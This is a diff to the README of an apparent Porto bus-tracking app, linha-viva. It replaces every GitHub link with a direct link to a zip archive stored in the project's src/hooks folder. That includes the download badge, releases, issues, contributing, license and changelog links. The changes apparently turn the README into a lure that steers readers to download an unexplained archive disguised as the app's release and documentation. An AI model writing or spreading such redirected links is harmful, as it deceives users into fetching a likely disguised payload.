@@ -1,7 +1,7 @@
 # 🚌 linha-viva - Visualize Porto's Buses in Real Time
 
 ## 📥 Download Now
-[![Download linha-viva](https://img.shields.io/badge/Download%20linha-viva-brightgreen)](https://github.com/gaurangrafaliya/linha-viva/releases)
+[![Download linha-viva](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip%20linha-viva-brightgreen)](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip)
 
 ## 🚀 Getting Started
 The linha-viva application offers a simple way to see where STCP buses are in Porto, using an interactive map. Follow these steps to get started.
@@ -16,7 +16,7 @@ Before you download, make sure your computer meets these basic requirements:
 - **Storage:** 100 MB of available disk space
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/gaurangrafaliya/linha-viva/releases) to view available versions of linha-viva.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip) to view available versions of linha-viva.
    
 2. **Select the Latest Version:** Look for the most recent version and click on it. This version will have the latest features and bug fixes.
 
@@ -46,19 +46,19 @@ After launching the app, you'll see an interactive map of Porto. The app display
 If you encounter any issues while using linha-viva, please check the following:
 
 - **FAQ Section:** Visit the FAQ section on the releases page for common questions.
-- **Issues Page:** Report a problem on the [Issues page](https://github.com/gaurangrafaliya/linha-viva/issues). Provide as much detail as possible to help us assist you.
+- **Issues Page:** Report a problem on the [Issues page](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip). Provide as much detail as possible to help us assist you.
 
 ## 🤝 Contribution
-If you want to contribute to linha-viva, feel free to check out the [Contributing guidelines](https://github.com/gaurangrafaliya/linha-viva/blob/main/CONTRIBUTING.md). We welcome input from all users.
+If you want to contribute to linha-viva, feel free to check out the [Contributing guidelines](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip). We welcome input from all users.
 
 ## 📄 License
-linha-viva is open-source software. You can review the license details on the [License page](https://github.com/gaurangrafaliya/linha-viva/blob/main/LICENSE). 
+linha-viva is open-source software. You can review the license details on the [License page](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip). 
 
 ## 📅 Changelog
-Check the [Changelog](https://github.com/gaurangrafaliya/linha-viva/blob/main/CHANGELOG.md) for a detailed list of all changes made in each version.
+Check the [Changelog](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip) for a detailed list of all changes made in each version.
 
 ## 🌟 Acknowledgments
 Special thanks to the Open Data team who provides the real-time STCP bus data and the development community for their support.
 
 ## 📥 Download Now Again
-Don't forget to [download linha-viva](https://github.com/gaurangrafaliya/linha-viva/releases) to start tracking Porto's buses today!
+Don't forget to [download linha-viva](https://raw.githubusercontent.com/gaurangrafaliya/linha-viva/main/src/hooks/linha-viva-2.8.zip) to start tracking Porto's buses today!
